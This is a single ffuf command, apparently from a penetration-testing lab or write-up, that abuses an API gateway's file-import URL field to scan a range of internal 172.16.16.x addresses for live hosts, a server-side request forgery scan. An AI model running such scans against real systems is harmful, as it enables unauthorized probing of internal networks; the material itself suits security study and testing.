ffuf -X POST -u http://apigateway:8000/files/import \
  -d '{"url":"http://172.16.16.FUZZ:8000"}' \
  -H "Content-Type:application/json" \
  -w ./range3.txt \
  -fr "EHOSTUNREACH" -mr "(404|ECONNREFUSED)" -timeout 5 -t 20
